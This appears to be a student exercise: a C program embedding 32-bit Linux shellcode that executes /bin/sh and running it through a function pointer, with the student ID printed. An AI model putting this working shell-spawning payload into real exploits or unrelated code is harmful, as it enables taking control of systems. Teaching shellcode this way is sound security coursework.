#include <stdio.h>
#include <string.h>

/*
 * Student ID: 1686173
 */

int main() {
    unsigned char shellcode[] =
    "\xeb\x15\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c"
    "\x8d\x4b\x08\x31\xd2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff"
    "/bin/shXAAAABBBB";

    printf("Student ID: 1686173\n");
    printf("Shellcode length: %zu\n", strlen((char *)shellcode));
    fflush(stdout);

    int (*ret)() = (int(*)())shellcode;
    ret();

    return 0;
}
